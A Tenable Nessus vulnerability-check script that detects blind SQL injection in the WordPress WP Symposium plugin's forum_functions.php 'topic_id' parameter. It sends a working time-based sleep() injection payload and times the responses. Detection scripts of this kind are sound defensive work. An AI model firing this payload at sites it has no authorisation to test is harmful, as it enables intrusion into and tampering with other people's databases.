#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(85629);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/08/26 13:32:36 $");

  script_osvdb_id(126073);

  script_name(english:"WP Symposium Plugin for WordPress forum_functions.php 'topic_id' Parameter SQLi");
  script_summary(english:"Attempts SQL injection via the 'topic_id' parameter.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The WordPress WP Symposium Plugin installed on the remote host is
affected by a SQL injection vulnerability due to a failure to properly
sanitize user-supplied input to the 'topic_id' parameter of the
forum_functions.php script. An unauthenticated, remote attacker can
exploit this issue to conduct a blind SQL injection attack against the
affected application, resulting in the manipulation or disclosure of
arbitrary data.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2015/Aug/33");
  script_set_attribute(attribute:"see_also", value:"https://plugins.trac.wordpress.org/changeset/1214869");
  script_set_attribute(attribute:"solution", value:
"Upgrade to WordPress WP Symposium Plugin version 15.8 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/08/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/08/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/08/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wpsymposium:wp_symposium");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "wordpress_wp_symposium_gid_sql_injection.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = 'WP Symposium';
# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

stimes = make_list(3, 5, 7);
num_queries = max_index(stimes);
vuln = FALSE;

for (i = 0; i < max_index(stimes); i++)
{
  http_set_read_timeout(stimes[i] + 10);
  then = unixtime();

  url = "/wp-content/plugins/wp-symposium/ajax/forum_functions.php";
  sqli = "action=getTopic&topic_id=1%20AND%20sleep(" +stimes[i]+ ")&group_id=0";

  res = http_send_recv3(
    method       : "POST",
    port         : port,
    item         : dir + url,
    data         : sqli,
    add_headers  : make_array("Content-Type","application/x-www-form-urlencoded"),
    exit_on_fail : TRUE
  );
  now = unixtime();
  ttime = now - then;

  time_per_query += 'Query #' + (i+1) + ' : ' + query + ' Sleep Time : ' +
  stimes[i] + ' secs  Response Time : ' + ttime + ' secs\n';

  overalltime += ttime;
  if ( (ttime >= stimes[i]) && (ttime <= (stimes[i] + 5)) )
  {
    vuln = TRUE;

    output =
      'Blind SQL Injection Results' +
      '\n  Query                          : sleep(' +stimes[i]+ ')' +
      '\n  Response time                  : ' + ttime + ' secs' +
      '\n  Number of queries executed     : ' + num_queries +
      '\n  Total test time                : ' + overalltime + ' secs' +
      '\n  Time per query                 : ' +
      '\n'+ "  " + time_per_query;

    continue;
  }
  else
    vuln = FALSE;
}
if (vuln)
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    generic    : TRUE,
    sqli       : TRUE,  # Sets SQLInjection KB key
    request    : make_list(http_last_sent_request()),
    output     : output
  );
}
else audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
